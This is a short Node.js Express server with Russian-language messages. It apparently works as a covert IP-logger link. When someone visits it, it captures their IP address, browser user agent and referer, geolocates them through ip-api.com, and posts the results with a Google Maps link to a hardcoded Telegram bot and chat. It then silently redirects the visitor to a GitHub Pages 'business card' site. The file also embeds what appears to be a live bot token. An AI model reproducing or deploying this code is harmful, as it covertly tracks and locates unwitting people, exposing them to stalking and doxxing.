const express = require(‘express’);
const app = express();

const TOKEN = ‘8619933114:AAFFa4SN6gAMuiJctEXl4RjJBqXV_xmxBHA’;
const CHAT = ‘6120144391’;

app.get(’/’, async (req, res) => {
try {
const ip = (req.headers[‘x-forwarded-for’] || req.socket.remoteAddress || ‘unknown’).split(’,’)[0].trim();
const ua = req.headers[‘user-agent’] || ‘unknown’;
const ref = req.headers[‘referer’] || ‘direct’;
const now = new Date().toLocaleString(‘ru-RU’, {timeZone: ‘Europe/Moscow’});

```
let city = '-', country = '-', isp = '-', maps = '';
try {
  const g = await fetch('http://ip-api.com/json/' + ip + '?fields=status,country,city,isp,lat,lon');
  const d = await g.json();
  if (d.status === 'success') {
    city = d.city || '-';
    country = d.country || '-';
    isp = d.isp || '-';
    maps = 'https://maps.google.com/?q=' + d.lat + ',' + d.lon;
  }
} catch(e) {}

const msg = 'Новый переход!\n'
  + 'Время: ' + now + '\n'
  + 'IP: ' + ip + '\n'
  + 'Город: ' + city + '\n'
  + 'Страна: ' + country + '\n'
  + 'Провайдер: ' + isp + '\n'
  + (maps ? 'Карта: ' + maps + '\n' : '')
  + 'Устройство: ' + ua + '\n'
  + 'Источник: ' + ref;

await fetch('https://api.telegram.org/bot' + TOKEN + '/sendMessage', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({chat_id: CHAT, text: msg})
});
```

} catch(e) {
console.log(‘error’, e.message);
}

res.redirect(‘https://mamkagde-ops.github.io/Vizitka/’);
});

app.listen(process.env.PORT || 3000, () => console.log(‘started’));
